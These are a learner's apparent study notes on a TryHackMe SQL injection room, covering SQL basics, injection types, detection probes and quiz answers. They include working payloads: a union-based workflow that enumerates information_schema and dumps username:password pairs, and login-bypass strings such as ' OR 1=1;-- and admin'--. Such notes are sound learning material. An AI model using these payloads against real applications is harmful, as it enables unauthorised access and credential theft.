# SQL Injection Introduction – TryHackMe

**Platform:** TryHackMe  
**Room:** SQL Injection Introduction  
**Part:** 1  
**Date:** 2 September 2026  
**Level:** Beginner

---

## SQL Essentials for Injection

Before learning SQL Injection techniques, I studied some SQL features that are commonly used in injection payloads.

### SQL Comments

Comments tell the database to ignore the remaining SQL.

MySQL comment syntax:

```sql
-- 
#
/* */
```

Example:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='secret';
```

Input such as:

```text
admin'-- 
```

can comment out the remaining part of the query.

### UNION

`UNION` combines the results of two or more `SELECT` statements into one result set.

The `SELECT` statements must return the **same number of columns** with compatible data types.

```sql
SELECT name, age FROM students
UNION
SELECT username, id FROM admins;
```

This is the basis of **Union-Based SQL Injection**.

### LIKE and Wildcards

`LIKE` is used for pattern matching.

- `%` → any sequence of characters
- `_` → exactly one character

```sql
SELECT * FROM users WHERE username LIKE 'adm%';
```

### LIMIT

`LIMIT` controls how many rows are returned.

```sql
SELECT * FROM users LIMIT 1;
SELECT * FROM users LIMIT 2, 1;
```

It can also be useful during injection to control which row is returned.

### String Functions

`group_concat()` combines values from multiple rows into one result.

```sql
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
```

`CONCAT()` joins values together:

```sql
CONCAT(username, ':', password)
```

### information_schema

`information_schema` contains metadata about databases, tables, columns and data types.

Important tables:

- `information_schema.tables` – information about tables
- `information_schema.columns` – information about columns

It can help reveal the structure of a database during SQL Injection testing.

> SQL syntax can vary between database engines such as MySQL, MSSQL, PostgreSQL, SQLite and Oracle.

---

# What is SQL Injection?

**SQL Injection (SQLi)** occurs when user input is directly included in a SQL query without proper sanitisation or parameterisation.

The input can then be interpreted as part of the SQL query instead of just normal data.

Example:

```sql
SELECT * FROM articles WHERE id = 1 AND public = 1;
```

If input is directly concatenated, an input such as:

```text
1 OR 1=1--
```

could change the query logic:

```sql
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```

Because `1=1` is always true, the query can return unintended results.

---

## Types of SQL Injection

### In-Band SQL Injection

The results of the injection are returned directly through the web application.

Two common types:

- **Error-Based** – database errors reveal information.
- **Union-Based** – `UNION` is used to retrieve additional data through the page.

### Blind SQL Injection

The application does not directly display useful query results or errors. Information is inferred from behaviour.

Examples:

- **Authentication Bypass**
- **Boolean-Based** – response changes depending on whether a condition is true or false.
- **Time-Based** – delays such as `SLEEP()` are used to infer results.

### Out-of-Band SQL Injection

The database makes an external request, such as a DNS request, allowing information to be transferred through another channel.

---

# Detecting SQL Injection

Common places to test include:

- URL parameters
- Login forms
- Search fields
- Comment fields
- Cookies
- HTTP headers

Basic test inputs include:

```text
'
"
;--
OR 1=1
```

A single quote `'` is a common first test. A database error or change in application behaviour can indicate possible SQL Injection.

If errors are hidden, behavioural or timing differences may help identify Blind SQL Injection.

---

# Questions I Answered

### What SQL statement combines results from two `SELECT` queries into one result set?

**Answer:** `UNION`

### What built-in database contains metadata about databases, tables, and columns in MySQL?

**Answer:** `information_schema`

### What character is commonly used as a first test when probing for SQL Injection?

**Answer:** `'` (single quote)

### What type of SQL Injection returns results directly in the web page?

**Answer:** In-Band SQL Injection

---

# My Takeaway

Today I learned the basic concepts of **SQL Injection** and some SQL features used when understanding injection payloads.

The main things I learned:

- SQL comments can remove the remaining part of a query.
- `UNION` combines results from multiple `SELECT` statements.
- `LIKE` is used for pattern matching.
- `LIMIT` controls returned rows.
- `CONCAT()` and `group_concat()` combine values.
- `information_schema` contains database metadata.
- SQL Injection happens when user input can change SQL query logic.
- SQLi can be **In-Band, Blind, or Out-of-Band**.
- `'` is a common first test for SQL Injection.
- **In-Band SQLi** returns results through the application response.

---

# Part 2

<!-- Space reserved for the next part of the SQL Injection Introduction room. -->



---

# Part 2

## In-Band SQL Injection

**In-Band SQL Injection** is the easiest and most common category because the same communication channel is used to send the injection and receive the results.

For example:

```text
Web Request → SQL Injection → Database → Web Page Response
```

The extracted information is visible directly in the application's response.

---

## Error-Based SQL Injection

**Error-Based SQL Injection** uses database error messages to obtain information.

If an application displays raw database errors, they may reveal:

- Database type
- SQL query structure
- Table names
- Other useful database information

For example, entering a single quote may cause a MySQL syntax error.

This can help confirm that the application is interacting with a database and that the input may be inserted into a SQL query.

> Error-Based SQLi can reveal useful structural information, but **Union-Based SQLi** is the main technique discussed for extracting larger amounts of data in this task.

---

## Union-Based SQL Injection

Union-Based SQLi uses `UNION` to append another `SELECT` query to the original query.

### Step 1 – Determine the Number of Columns

The number of columns in both `SELECT` statements must match.

Example:

```sql
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
```

The successful query indicates the required column count.

### Step 2 – Identify Displayed Columns

Use a value that normally returns no results so that the injected result is displayed.

Example:

```sql
0 UNION SELECT 1,2,3
```

The values visible on the page show which column positions can be used for extracting information.

### Step 3 – Find the Database Name

MySQL provides the `database()` function:

```sql
0 UNION SELECT 1,2,database()
```

This returns the name of the current database.

### Step 4 – Enumerate Tables

`information_schema.tables` can be queried to discover table names.

```sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'database_name'
```

### Step 5 – Enumerate Columns

After finding an interesting table, its columns can be discovered:

```sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'target_table'
```

### Step 6 – Extract Data

Once the table and column names are known, data can be selected:

```sql
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM target_table
```

### Union-Based SQLi Workflow

```text
Find Injection
      ↓
Determine Column Count
      ↓
Find Displayed Column
      ↓
Find Database Name
      ↓
Enumerate Tables
      ↓
Enumerate Columns
      ↓
Extract Relevant Data
```

### Why Each Step Matters

| Step | Purpose |
|---|---|
| Column count | `UNION` requires matching column counts |
| Displayed column | Determines where extracted data appears |
| `database()` | Identifies the current database |
| `information_schema.tables` | Finds table names |
| `information_schema.columns` | Finds column names |
| Final `SELECT` | Retrieves relevant data |

---

## Questions – Task 4

### What subtype of In-Band SQLi relies on database error messages to extract information?

**Answer:** Error-Based SQL Injection

### What SQL function returns the name of the current database in MySQL?

**Answer:** `database()`

---

# Blind SQL Injection – Authentication Bypass

Blind SQL Injection happens when the application does not directly display database results or useful error messages.

Instead, the attacker has to infer the result from the application's behaviour.

Examples of signals include:

- Successful login
- Failed login
- Different page content
- Response timing

---

## How Authentication Queries Work

A typical login query can look like:

```sql
SELECT * FROM users
WHERE username='bob'
AND password='secret123'
LIMIT 1;
```

If the query returns a row, the application may authenticate the user.

If no row is returned, authentication fails.

The important point is that the application usually does not display the database result itself. It only shows the outcome, such as a dashboard or an "Invalid credentials" message.

---

## Authentication Bypass Concept

The lesson demonstrates how changing the logic of the `WHERE` clause can cause it to evaluate as true.

Example:

```text
' OR 1=1;--
```

The resulting query can resemble:

```sql
SELECT * FROM users
WHERE username='' OR 1=1;--'
AND password='anything'
LIMIT 1;
```

The important parts are:

- `username=''` → checks an empty username
- `OR 1=1` → introduces a condition that is always true
- `--` → comments out the remaining query
- The application may receive a returned row and treat the login as successful

---

## Targeting a Specific User

If a username is already known, the lesson also demonstrates:

```text
admin'--
```

This can produce a query where the password-checking portion is commented out.

Conceptually:

```sql
SELECT * FROM users
WHERE username='admin'--'
AND password='anything'
LIMIT 1;
```

This demonstrates why directly concatenating user input into SQL queries is dangerous.

---

## Common Variations

The exact syntax depends on how the application constructs its query.

Examples covered in the lesson include:

```text
' OR 1=1;--
' OR 1=1#
" OR 1=1--
```

The vulnerable input field can also vary. Depending on the application's query construction, the username field, password field, or another input may be involved.

---

## Detection in a Login Form

During authorised security testing, authentication forms can be tested for SQL Injection by observing whether specially crafted input changes the application's authentication behaviour.

The important indicator is a difference in behaviour between normal input and SQL-manipulating input.

The practical walkthrough in this room provides a visible SQL Query box, making it easier to understand how the supplied username and password become part of the SQL query.

---

## Questions – Task 5

### What boolean condition is commonly injected to make a `WHERE` clause always evaluate to true?

**Answer:** `1=1`

---

# My Takeaway – Part 2

Today I learned more practical SQL Injection concepts:

- **In-Band SQLi** returns results through the same channel used for the injection.
- **Error-Based SQLi** uses database error messages as a source of information.
- **Union-Based SQLi** uses `UNION SELECT` to retrieve additional data.
- The number of columns must match when using `UNION`.
- `database()` can identify the current database in MySQL.
- `information_schema` can be used to understand database structure.
- The general Union-Based workflow is:
  **columns → displayed column → database → tables → columns → data**.
- **Blind SQLi** does not directly show database results.
- Authentication bypass can rely on changing the logic of a `WHERE` clause.
- `1=1` is a condition that always evaluates to true.

---

# Part 3

<!-- Space reserved for the next part of the SQL Injection Introduction room. -->

